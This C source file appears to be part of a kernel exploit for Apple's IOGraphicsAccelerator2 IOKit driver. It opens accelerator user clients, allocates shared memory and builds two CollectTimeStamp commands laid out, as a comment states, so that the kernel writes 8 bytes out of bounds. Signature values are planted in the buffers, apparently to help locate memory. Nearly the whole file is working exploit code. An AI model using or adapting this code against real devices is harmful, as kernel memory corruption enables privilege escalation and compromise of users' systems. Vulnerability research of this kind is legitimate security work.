#include "ioaccel.h"
#include "iokit.h"
#include "helper.h"

io_connect_t IOAccelDevice2Conn = IO_OBJECT_NULL;
io_connect_t IOAccelContext2Client = IO_OBJECT_NULL;
io_service_t IOGraphicsAccelerator2;

int IOAccelerator_init() {
    IOGraphicsAccelerator2 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGraphicsAccelerator2"));
    if (!IOGraphicsAccelerator2) {
        ERROR("Failed to find IOGraphicsAccelerator2 service\n");
        return KERN_FAILURE;
    }

    kern_return_t kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), kIOAccelDevice2Type, &IOAccelDevice2Conn);
    if (kr) {
        ERROR("Failed to open IOAccelDevice2Conn: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }

    kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(),
            kIOAccelContext2Type, &IOAccelContext2Client);
    if (kr) {
        ERROR("Failed to open IOAccelContext2Client: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }
    
    kr = IOConnectAddClient(IOAccelDevice2Conn, IOAccelContext2Client);
    if (kr) {
        ERROR("Failed to connect IOAccelDevice2Conn to IOAccelContext2Client: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }

    mach_port_t notification_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    IOAccelCommandQueue2_set_notification_port(notification_port);
    
    return 0;
}

void IOAccelerator_deinit() {
    if (IOGraphicsAccelerator2) IOObjectRelease(IOGraphicsAccelerator2);
    if (IOAccelDevice2Conn) IOServiceClose(IOAccelDevice2Conn);
    if (IOAccelContext2Client) IOServiceClose(IOAccelContext2Client);
    
    IOGraphicsAccelerator2 = 0;
    IOAccelDevice2Conn = 0;
    IOAccelContext2Client = 0;
}

kern_return_t IOAccelCommandQueue2_set_notification_port(mach_port_t notification_port) {
    return IOConnectCallAsyncMethod(IOAccelDevice2Conn, IOAccelCommandQueue2_set_notification_port_selector, notification_port, NULL, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
}

kern_return_t IOAccelCommandQueue2_submit_command_buffers(const struct IOAccelCommandQueueSubmitArgs_Header *submit_args, size_t size) {
    return IOConnectCallMethod(IOAccelDevice2Conn, IOAccelCommandQueue2_submit_command_buffers_selector, NULL, 0, submit_args, size, NULL, NULL, NULL, NULL);
}

kern_return_t IOAccelSharedUserClient2_create_shmem(size_t size, struct IOAccelDeviceShmemData *shmem) {
    size_t out_size = sizeof(*shmem);
    uint64_t shmem_size = size;
    return IOConnectCallMethod(IOAccelContext2Client, IOAccelSharedUserClient2_create_shmem_selector, &shmem_size, 1, NULL, 0, NULL, NULL, shmem, &out_size);
}

kern_return_t IOAccelSharedUserClient2_destroy_shmem(uint32_t shmem_id) {
    uint64_t id = shmem_id;
    return IOConnectCallMethod(IOAccelContext2Client, IOAccelSharedUserClient2_destroy_shmem_selector, &id, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

struct {
    struct IOAccelCommandQueueSubmitArgs_Header header;
    struct IOAccelCommandQueueSubmitArgs_Command command;
} submit_args = {};

int alloc_shmem(uint32_t buffer_size, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist, bool set_signature) {
    struct IOAccelDeviceShmemData command_buffer_shmem;
    struct IOAccelDeviceShmemData segment_list_shmem;
    
    kern_return_t kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &command_buffer_shmem);
    if (kr) {
        printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }
    
    kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &segment_list_shmem);
    if (kr) {
        printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
        return kr;
    }

    if(set_signature) {
        *(uint64_t*)(command_buffer_shmem.data + 0x1000) = 0x4142434445464748;
        *(uint64_t*)(segment_list_shmem.data + 0x1000) = 0x5152535455565758;
    }
    
    *cmdbuf = command_buffer_shmem;
    *seglist = segment_list_shmem;
    
    submit_args.header.count = 1;
    submit_args.command.command_buffer_shmem_id = command_buffer_shmem.shmem_id;
    submit_args.command.segment_list_shmem_id = segment_list_shmem.shmem_id;

    struct IOAccelSegmentListHeader *slh = segment_list_shmem.data;
    slh->length = 0x100;
    slh->segment_count = 1;
    
    struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
    srlh->kernel_commands_start_offset = 0;
    srlh->kernel_commands_end_offset = buffer_size;
    
    // this is just a filler for the first 0x4000 - n bytes, timestamp written in off_timestamp = 8
    struct IOAccelKernelCommand_CollectTimeStamp *cmd1 = command_buffer_shmem.data;
    cmd1->command.type = 2;
    cmd1->command.size = (uint32_t)buffer_size - 16;
    
    // put command 2 after command 1, so now timestamp written in cmd1->command.size + off_timestamp (8) = 0x4000 <= 8 bytes written OOB!
    struct IOAccelKernelCommand_CollectTimeStamp *cmd2 = (void *)((uint8_t *)cmd1 + cmd1->command.size);
    cmd2->command.type = 2;
    cmd2->command.size = 8;
    
    return IOAccelCommandQueue2_submit_command_buffers(&submit_args.header, sizeof(submit_args));
}